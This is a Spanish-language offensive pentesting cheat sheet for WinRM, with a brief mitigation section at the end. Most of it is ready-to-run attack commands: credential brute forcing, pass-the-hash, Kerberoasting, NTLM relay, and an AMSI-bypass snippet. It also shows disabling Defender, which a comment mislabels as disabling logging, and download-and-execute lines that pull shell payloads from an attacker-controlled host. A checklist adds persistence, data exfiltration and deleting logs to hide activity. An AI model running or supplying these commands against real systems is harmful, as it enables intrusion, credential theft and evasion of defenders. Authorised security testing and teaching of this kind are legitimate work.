## 📋 Índice
1. [¿Qué es WinRM?](#qué-es-winrm)
2. [Arquitectura y Funcionamiento](#arquitectura-y-funcionamiento)
3. [Enumeración](#enumeración)
4. [Vectores de Explotación](#vectores-de-explotación)
5. [Post-Explotación Avanzada](#post-explotación-avanzada)
6. [Checklist de Pentesting](#checklist-de-pentesting)

---

## 🔍 ¿Qué es WinRM?

>[!Recuerda]
> WinRM es como SSH para Windows

**WinRM (Windows Remote Management)** es el servicio de gestión remota de Microsoft basado en **WS-Management (Web Services-Management)**, un protocolo estándar de la industria. Permite:

- **Ejecución remota de comandos** (PowerShell, CMD)
- **Gestión remota de sistemas Windows**
- **Recolección de logs y métricas** (WMI, event logs)
- **Configuración remota** de servidores
- **Administración sin agentes** (agentless management)

### Comparativa con otros protocolos de administración remota

| Protocolo | Puerto          | Transporte | Características                           |
| --------- | --------------- | ---------- | ----------------------------------------- |
| **WinRM** | 5985/5986       | HTTP/HTTPS | PowerShell nativo, moderno, seguro        |
| **SMB**   | 445             | TCP        | Compartición de archivos, PSExec          |
| **RDP**   | 3389            | TCP        | Escritorio remoto gráfico                 |
| **SSH**   | 22              | TCP        | Estándar Linux, disponible en Windows 10+ |
| **WMI**   | 135/49152-65535 | TCP        | Predecesor de WinRM, más complejo         |
### Versiones de WinRM
| Versión    | SO                          | Características                    |
| ---------- | --------------------------- | ---------------------------------- |
| WinRM 1.0  | Windows Server 2003         | Implementación inicial             |
| WinRM 2.0  | Windows 7/Server 2008 R2    | PowerShell remoto integrado        |
| WinRM 3.0  | Windows 8/Server 2012       | Mejoras de rendimiento             |
| WinRM 4.0+ | Windows 8.1/Server 2012 R2+ | HTTPS por defecto, mejor seguridad ||

---
## 🌐 Arquitectura y Funcionamiento

### Puertos y Protocolos
| Puerto        | Protocolo | Descripción                                                |
| ------------- | --------- | ---------------------------------------------------------- |
| **5985/TCP**  | HTTP      | WinRM sin cifrar (mensajes cifrados a nivel de aplicación) |
| **5986/TCP**  | HTTPS     | WinRM sobre SSL/TLS                                        |
| **47001/TCP** | HTTP      | WinRM "Compatibility Listener" (para trusted hosts)        |
| **80/TCP**    | HTTP      | Legacy (WinRM 1.0, deshabilitado por defecto)              |
| **443/TCP**   | HTTPS     | Legacy (WinRM 1.0, deshabilitado por defecto)              |

> **Nota**: Aunque el puerto 5985 usa HTTP, los mensajes SOAP están cifrados mediante **SPNEGO** (Kerberos/NTLM) por defecto.


### Flujo de autenticación


1. NEGOCIACIÓN Cliente ──HTTP POST──> Servidor (puerto 5985) "¿Qué métodos de auth soportas?"
2. RESPUESTA Cliente <──401 Unauthorized── Servidor "Soporto: Negotiate (SPNEGO), Kerberos, NTLM"
3. AUTENTICACIÓN Cliente ──HTTP POST + Token NTLM/Kerberos──> Servidor
4. SESIÓN ESTABLECIDA Cliente <──200 OK── Servidor "Sesión de WinRM creada, ID: uuid-xxx"
5. COMANDOS Cliente ──SOAP: Create Pipeline──> Servidor Cliente <──SOAP: Command Output── Servidor

## 🛠️ Enumeración

### 1. Detección de WinRM con Nmap

```bash
# Escaneo básico de puertos WinRM
nmap -p5985,5986 -sV <IP>

# Escaneo con scripts específicos
nmap -p5985,5986 --script http-winrm-enum <IP>

# Detección de métodos de autenticación
nmap -p5985 --script http-enum --script-args http-enum.displayall <IP>
````

### 2. Metasploit

```bash
msfconsole

# Módulo de escaneo
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS <IP>
run

# Módulo de login
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <IP>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Módulo de ejecución de comandos
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS <IP>
set USERNAME administrator
set PASSWORD Password123
set CMD whoami
run

# Módulo de script
use auxiliary/scanner/winrm/winrm_script
set RHOSTS <IP>
set USERNAME administrator
set PASSWORD Password123
set SCRIPT C:\\windows\\temp\\script.ps1
run
```

---

## ⚔️ Vectores de Explotación

### 1. **Fuerza Bruta de Credenciales** 

**Hydra**:

```bash
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt winrm://<IP>
```

**CrackMapExec** (recomendado, más sigiloso):

```bash
# Password spraying (una contraseña, muchos usuarios)
crackmapexec winrm <IP> -u users.txt -p 'Password123' --continue-on-success

# Fuerza bruta completa
crackmapexec winrm <IP> -u users.txt -p passwords.txt

# Usar hash en lugar de password
crackmapexec winrm <IP> -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

**Medusa**:

```bash
medusa -h <IP> -u administrator -P passwords.txt -M winrm
```

**Metasploit**:

```bash
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <IP>
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

---

### 2. **Pass-the-Hash (PtH)** 🔥

**Descripción**: Usar hashes NTLM directamente sin conocer la contraseña en texto plano.

**Requisitos**: El hash debe ser válido y el usuario debe tener permisos de WinRM.

**Evil-WinRM**: 🔥

```bash
# Hash completo (LM:NT)
evil-winrm -i <IP> -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Solo parte NT (si LM está vacío)
evil-winrm -i <IP> -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

**CrackMapExec**:

```bash
crackmapexec winrm <IP> -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami
```

**Mimikatz + PowerShell**:

```powershell
# Inyectar hash en memoria (requiere SYSTEM o privilegios elevados)
sekurlsa::pth /user:administrator /domain:<DOMINIO> /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell

# Luego desde la nueva PowerShell
Enter-PSSession -ComputerName <IP>
```

---

### 3. **Kerberoasting sobre WinRM** 

**Descripción**: Obtener tickets de servicio Kerberos para cuentas de servicio y crackearlos offline.

**Detección**:

```bash
# Listar SPNs (Service Principal Names) relacionados con WinRM
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | 
    Where-Object {$_.ServicePrincipalName -like "*HTTP*" -or $_.ServicePrincipalName -like "*WSMAN*"}

# O con Impacket
python3 GetUserSPNs.py <DOMINIO>/<USUARIO>:<PASSWORD> -dc-ip <DC_IP> -request
```

**Explotación**:

```bash
# Solicitar ticket
python3 GetUserSPNs.py <DOMINIO>/<USUARIO>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile hashes.kerberoast

# Crackear con Hashcat
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt

# Usar credenciales obtenidas con WinRM
evil-winrm -i <IP> -u svc_winrm -p '<PASSWORD_CRACKEADO>'
```

---

### 4. **AS-REP Roasting** 

**Descripción**: Usuarios con "Do not require Kerberos preauthentication" (UF_DONT_REQUIRE_PREAUTH).

**Detección y explotación**:

```bash
# Con Impacket
python3 GetNPUsers.py <DOMINIO>/ -dc-ip <DC_IP> -format hashcat -outputfile asrep_hashes.txt

# Crackear
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Usar con WinRM
evil-winrm -i <IP> -u usuario_sin_preauth -p '<PASSWORD_CRACKEADO>'
```

---

### 5. **Relay NTLM a WinRM** 

**Descripción**: Capturar autenticación NTLM y retransmitirla a WinRM.

**Condiciones**:

- SMB signing deshabilitado en el objetivo (o usar otro vector)
- WinRM accesible desde la posición del atacante
- Usuario con privilegios de WinRM

**Herramienta ntlmrelayx**:

```bash
# Configurar relay hacia WinRM
python3 ntlmrelayx.py -t http://<IP_TARGET>:5985/wsman -smb2support

# Con shell interactiva
python3 ntlmrelayx.py -t http://<IP_TARGET>:5985/wsman -smb2support -i

# Ejecutar comando directamente
python3 ntlmrelayx.py -t http://<IP_TARGET>:5985/wsman -smb2support -c 'whoami'

# En otra terminal, forzar autenticación desde víctima
# (usando Responder, PetitPotam, PrinterBug, etc.)
responder -I eth0 -wrfv
```

**Mitigación**: Habilitar **Extended Protection for Authentication (EPA)** en WinRM y SMB signing.

---

### 6. **Abuso de Certificados (PKINIT)** 

**Descripción**: Si hay AD CS (Active Directory Certificate Services), obtener certificado para autenticación.

**Herramienta Certipy**:

```bash
# Solicitar certificado para usuario con permisos WinRM
certipy req -u <USUARIO>@<DOMINIO> -p <PASSWORD> -ca <CA_NAME> -template User -target <CA_SERVER>

# Autenticar con certificado (obtiene TGT)
certipy auth -pfx <USUARIO>.pfx -dc-ip <DC_IP>

# Usar con Evil-WinRM (requiere exportar certificado)
evil-winrm -i <IP> -c cert.pem -k key.pem
```

---

### 7. **Bypass de AMSI y Logging** 

**Descripción**: Evadir Anti-Malware Scan Interface y logging de PowerShell.

**Desde Evil-WinRM**:

```powershell
# Bypass AMSI integrado
Bypass-4MSI

# Bypass manual si el anterior falla
$a = [Ref].Assembly.GetTypes() | ForEach-Object { if ($_.Name -like "*iUtils") { $_ } }
$b = $a.GetFields('NonPublic,Static')
$b | ForEach-Object { if ($_.Name -like "*Context") { $c = $_ } }
$v = $c.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32($v, 0x41414141)

# Desactivar logging de PowerShell
Set-MpPreference -DisableRealtimeMonitoring $true
```

---

### 8. **Ejecución Remota de Binarios (LOLBas)** 

**Descripción**: Usar herramientas legítimas de Windows para ejecutar código.

**Desde sesión WinRM**:

```powershell
# Descargar y ejecutar con certutil
certutil -urlcache -split -f http://<TU_IP>/shell.exe C:\Windows\Temp\shell.exe
C:\Windows\Temp\shell.exe

# Con bitsadmin
bitsadmin /transfer myjob /download /priority high http://<TU_IP>/shell.exe C:\Windows\Temp\shell.exe

# Con PowerShell
IEX (New-Object Net.WebClient).DownloadString('http://<TU_IP>/Invoke-PowerShellTcp.ps1')

# Con WMI (si WinRM falla)
wmic /node:<IP> process call create "powershell -enc <BASE64>"
```

---

### 9. **Vulnerabilidades Específicas**

#### **CVE-2021-26855 (ProxyLogon) + WinRM**


```bash
# Después de explotar Exchange, usar WinRM para pivotar
evil-winrm -u 'NT AUTHORITY\SYSTEM' -H <HASH> -i <EXCHANGE_IP>
```

#### **NoPac (SamAccountName Spoofing)**

```bash
# Obtener privilegios de Domain Admin, luego usar WinRM
python3 noPac.py <DOMINIO>/<USUARIO>:<PASSWORD> -dc-ip <DC_IP> -shell
# Luego conectar a cualquier máquina con WinRM
```

#### **PrintNightmare (CVE-2021-34527)**

```powershell
# Escalar privilegios locales, luego usar WinRM desde sesión SYSTEM
Invoke-Nightmare
# Nuevo usuario creado con privilegios, usar para WinRM
```

---

## ✅ Checklist de Pentesting WinRM

### Fase 1: Descubrimiento

- [ ] Escaneo de puertos 5985 (HTTP) y 5986 (HTTPS)
- [ ] Verificar si 5986 tiene certificado válido/auto-firmado
- [ ] Detectar métodos de autenticación soportados
- [ ] Enumerar versión de WinRM/OS

### Fase 2: Obtención de credenciales

- [ ] Fuerza bruta de credenciales locales
- [ ] Pass-the-Hash si se tienen hashes
- [ ] Kerberoasting (buscar SPNs HTTP/WSMAN)
- [ ] AS-REP Roasting
- [ ] Relay NTLM desde otros servicios

### Fase 3: Acceso inicial

- [ ] Conectar con evil-winrm (shell interactiva)
- [ ] Ejecutar comandos con crackmapexec
- [ ] Establecer sesión persistente
- [ ] Verificar privilegios del usuario

### Fase 4: Escalada de privilegios

- [ ] Enumerar usuarios con privilegios locales
- [ ] Buscar tokens de otros usuarios
- [ ] Explotar vulnerabilidades locales
- [ ] Abusar de configuraciones débiles

### Fase 5: Post-explotación

- [ ] Recolectar credenciales (SAM, LSASS, tickets)
- [ ] Mapear red interna
- [ ] Movimiento lateral a otros hosts
- [ ] Establecer persistencia
- [ ] Exfiltrar datos sensibles

### Fase 6: Limpieza

- [ ] Eliminar logs de WinRM (WinRM Operational Log)
- [ ] Borrar historial de PowerShell
- [ ] Eliminar usuarios/backdoors creados
- [ ] Restaurar configuración modificada

---

## 🛡️ Recomendaciones de Mitigación

### Configuración segura de WinRM

```powershell
# 1. Habilitar solo HTTPS (5986)
winrm quickconfig -transport:https

# 2. Requerir certificados de cliente (autenticación mutua)
winrm set winrm/config/client/auth '@{Certificate="true"}'

# 3. Limitar TrustedHosts (evitar *)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "" -Force

# 4. Configurar timeouts cortos
winrm set winrm/config @{MaxTimeoutms="60000"}

# 5. Limitar tamaño de respuesta
winrm set winrm/config @{MaxEnvelopeSizekb="512"}

# 6. Habilitar logging detallado
wevtutil sl Microsoft-Windows-WinRM/Operational /e:true

# 7. Restringir acceso por IP (firewall)
New-NetFirewallRule -Name "WinRM-HTTPS-In-IP" -DisplayName "WinRM HTTPS Inbound IP" -Direction Inbound -Protocol TCP -LocalPort 5986 -RemoteAddress 192.168.1.0/24 -Action Allow
```